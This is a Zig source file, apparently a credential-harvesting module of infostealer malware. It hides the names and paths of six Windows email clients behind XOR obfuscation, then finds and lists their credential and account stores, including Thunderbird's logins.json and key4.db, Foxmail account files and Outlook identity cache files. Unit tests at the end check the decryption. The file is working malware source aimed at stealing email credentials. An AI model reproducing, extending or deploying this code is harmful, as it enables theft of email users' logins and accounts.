const std = @import("std");
const hash = @import("../types/hash.zig");

pub const EmailEntry = struct {
    name: []const u8,
    files: [][]const u8,
};

const E = struct {
    pub const num_emails = 6;
    pub const names = [num_emails][]const u8{
        &hash.xorEncrypt("Outlook"),
        &hash.xorEncrypt("Thunderbird"),
        &hash.xorEncrypt("Foxmail"),
        &hash.xorEncrypt("eM Client"),
        &hash.xorEncrypt("Windows Mail"),
        &hash.xorEncrypt("Mailbird"),
    };
    pub const paths = [num_emails][]const u8{
        &hash.xorEncrypt("Microsoft\\IdentityCache"),
        &hash.xorEncrypt("Thunderbird\\Profiles"),
        &hash.xorEncrypt("Foxmail"),
        &hash.xorEncrypt("eM Client"),
        &hash.xorEncrypt("Comms"),
        &hash.xorEncrypt("Mailbird\\Store"),
    };
    pub const use_local = [num_emails]bool{
        true,  // Outlook
        false, // Thunderbird
        true,  // Foxmail (install dir fallback)
        false, // eM Client
        true,  // Windows Mail
        true,  // Mailbird
    };
};

fn dirExists(path: []const u8) bool {
    var dir = std.fs.openDirAbsolute(path, .{}) catch return false;
    dir.close();
    return true;
}

fn listFilesByExt(allocator: std.mem.Allocator, dir_path: []const u8, ext: []const u8) ![][]const u8 {
    var files = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (files.items) |f| allocator.free(f);
        files.deinit();
    }
    var dir = try std.fs.openDirAbsolute(dir_path, .{ .iterate = true });
    defer dir.close();
    var iter = dir.iterate();
    while (try iter.next()) |entry| {
        if (entry.kind != .file) continue;
        if (!std.mem.endsWith(u8, entry.name, ext)) continue;
        const full = try std.fs.path.join(allocator, &[_][]const u8{ dir_path, entry.name });
        try files.append(full);
    }
    return try files.toOwnedSlice();
}

fn listFilesByExts(allocator: std.mem.Allocator, dir_path: []const u8, exts: []const []const u8) ![][]const u8 {
    var files = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (files.items) |f| allocator.free(f);
        files.deinit();
    }
    var dir = try std.fs.openDirAbsolute(dir_path, .{ .iterate = true });
    defer dir.close();
    var iter = dir.iterate();
    while (try iter.next()) |entry| {
        if (entry.kind != .file) continue;
        for (exts) |ext| {
            if (std.mem.endsWith(u8, entry.name, ext)) {
                const full = try std.fs.path.join(allocator, &[_][]const u8{ dir_path, entry.name });
                try files.append(full);
                break;
            }
        }
    }
    return try files.toOwnedSlice();
}

fn collectThunderbird(allocator: std.mem.Allocator, profiles_path: []const u8) ![][]const u8 {
    var result = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (result.items) |r| allocator.free(r);
        result.deinit();
    }
    var dir = std.fs.openDirAbsolute(profiles_path, .{ .iterate = true }) catch return try allocator.alloc([]const u8, 0);
    defer dir.close();
    var iter = dir.iterate();
    while (iter.next() catch {}) |entry| {
        if (entry.kind != .directory) continue;
        const targets = [_][]const u8{ "logins.json", "key4.db", "cert9.db" };
        for (targets) |t| {
            const fp = std.fs.path.join(allocator, &[_][]const u8{ profiles_path, entry.name, t }) catch continue;
            var file = std.fs.openFileAbsolute(fp, .{}) catch {
                allocator.free(fp);
                continue;
            };
            file.close();
            try result.append(fp);
        }
    }
    return try result.toOwnedSlice();
}

fn collectFoxmail(allocator: std.mem.Allocator, local_app: []const u8) ![][]const u8 {
    const install_paths = [_][]const u8{ local_app, "C:\\Program Files\\Foxmail", "C:\\Program Files (x86)\\Foxmail" };
    var result = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (result.items) |r| allocator.free(r);
        result.deinit();
    }
    for (install_paths) |base| {
        const storage_path = std.fs.path.join(allocator, &[_][]const u8{ base, "Storage" }) catch continue;
        var storage_dir = std.fs.openDirAbsolute(storage_path, .{ .iterate = true }) catch {
            allocator.free(storage_path);
            continue;
        };
        defer storage_dir.close();
        var s_iter = storage_dir.iterate();
        while (s_iter.next() catch {}) |s_entry| {
            if (s_entry.kind != .directory) continue;
            const accounts_path = std.fs.path.join(allocator, &[_][]const u8{ storage_path, s_entry.name, "Accounts" }) catch continue;
            var accounts_dir = std.fs.openDirAbsolute(accounts_path, .{ .iterate = true }) catch {
                allocator.free(accounts_path);
                continue;
            };
            defer accounts_dir.close();
            var a_iter = accounts_dir.iterate();
            while (a_iter.next() catch {}) |a_entry| {
                if (a_entry.kind != .file) continue;
                const fp = std.fs.path.join(allocator, &[_][]const u8{ accounts_path, a_entry.name }) catch continue;
                try result.append(fp);
            }
            allocator.free(accounts_path);
        }
        allocator.free(storage_path);
    }
    return try result.toOwnedSlice();
}

fn collectEmailFiles(allocator: std.mem.Allocator, index: usize, full_path: []const u8, local_app: []const u8) ![][]const u8 {
    switch (index) {
        0 => return listFilesByExt(allocator, full_path, ".bin"),
        1 => return collectThunderbird(allocator, full_path),
        2 => return collectFoxmail(allocator, local_app),
        3 => return listFilesByExts(allocator, full_path, &[_][]const u8{ ".dat", ".db" }),
        4 => return listFilesByExt(allocator, full_path, ".json"),
        5 => return listFilesByExt(allocator, full_path, ".db"),
        else => return allocator.alloc([]const u8, 0),
    }
}

pub fn collect(allocator: std.mem.Allocator, local: []const u8, roaming: []const u8) ![]EmailEntry {
    var entries = std.ArrayList(EmailEntry).init(allocator);
    errdefer {
        for (entries.items) |e| {
            allocator.free(e.name);
            for (e.files) |f| allocator.free(f);
            allocator.free(e.files);
        }
        entries.deinit();
    }

    inline for (0..E.num_emails) |i| {
        const base = if (E.use_local[i]) local else roaming;

        const pe = E.paths[i];
        var path_buf: [pe.len]u8 = undefined;
        hash.xorDecrypt(pe, &path_buf);

        const full_path = std.fs.path.join(allocator, &[_][]const u8{ base, &path_buf }) catch continue;

        if (i != 1 and i != 2) {
            if (!dirExists(full_path)) {
                allocator.free(full_path);
                continue;
            }
        }

        const files = collectEmailFiles(allocator, i, full_path, local) catch |err| {
            allocator.free(full_path);
            if (err == error.FileNotFound or err == error.NotDir or err == error.AccessDenied) continue;
            return err;
        };

        allocator.free(full_path);

        const ne = E.names[i];
        var name_buf: [ne.len]u8 = undefined;
        hash.xorDecrypt(ne, &name_buf);
        const name = allocator.dupe(u8, &name_buf) catch {
            for (files) |f| allocator.free(f);
            allocator.free(files);
            return error.OutOfMemory;
        };

        try entries.append(EmailEntry{ .name = name, .files = files });
    }

    return try entries.toOwnedSlice();
}

test "all email names decrypt correctly" {
    inline for (0..E.num_emails) |i| {
        var buf: [E.names[i].len]u8 = undefined;
        hash.xorDecrypt(E.names[i], &buf);
        try std.testing.expect(buf.len > 0);
    }
}

test "Outlook name decrypts" {
    var buf: [E.names[0].len]u8 = undefined;
    hash.xorDecrypt(E.names[0], &buf);
    try std.testing.expectEqualStrings("Outlook", &buf);
}

test "collect returns empty for nonexistent paths" {
    const result = try collect(std.testing.allocator, "C:\\__nonexistent__local", "C:\\__nonexistent__roaming");
    defer {
        for (result) |e| {
            std.testing.allocator.free(e.name);
            for (e.files) |f| std.testing.allocator.free(f);
            std.testing.allocator.free(e.files);
        }
        std.testing.allocator.free(result);
    }
    try std.testing.expectEqual(@as(usize, 0), result.len);
}

test "decrypted paths are non-empty" {
    inline for (0..E.num_emails) |i| {
        var buf: [E.paths[i].len]u8 = undefined;
        hash.xorDecrypt(E.paths[i], &buf);
        try std.testing.expect(buf.len > 0);
        try std.testing.expect(buf[0] != 0);
    }
}
